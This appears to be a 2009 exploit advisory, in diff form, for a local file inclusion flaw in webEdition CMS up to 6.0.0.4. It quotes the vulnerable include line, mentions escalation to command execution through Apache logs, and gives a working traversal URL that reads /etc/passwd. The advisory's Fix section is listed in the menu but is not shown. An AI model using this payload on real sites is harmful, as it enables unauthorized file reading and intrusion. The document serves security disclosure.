@@ -1,0 +1,55 @@
+*******   Salvatore "drosophila" Fresta   *******
+
+[+] Application: webEdition
+[+] Version: <= 6.0.0.4
+[+] Website: http://www.webedition.de
+
+[+] Bugs: [A] Local File Inclusion
+
+[+] Exploitation: Remote
+[+] Date: 31 Mar 2009
+
+[+] Discovered by: Salvatore "drosophila" Fresta
+[+] Author: Salvatore "drosophila" Fresta
+[+] Contact: e-mail: drosophilaxxx@gmail.com
+
+
+*************************************************
+
+[+] Menu
+
+1) Bugs
+2) Code
+3) Fix
+
+
+*************************************************
+
+[+] Bugs
+
+
+- [A] Local File Inclusion
+
+[-] Requisites: register_globals = on
+
+This bug allows a guest to include local files.
+This tecnique can be used to exec remote commands
+on the vulnerable system using Apache logs.
+
+...
+
+include_once($_SERVER["DOCUMENT_ROOT"]."/webEdition/we/include/we_language/".$GLOBALS["WE_LANGUAGE"]."/start.inc.php");
+
+...
+
+
+*************************************************
+
+[+] Code
+
+
+- [A] Local File Inclusion
+
+http://www.site.com/path/index.php?WE_LANGUAGE=../../../../../../../../etc/passwd%00
+
+# milw0rm.com [2009-03-31]
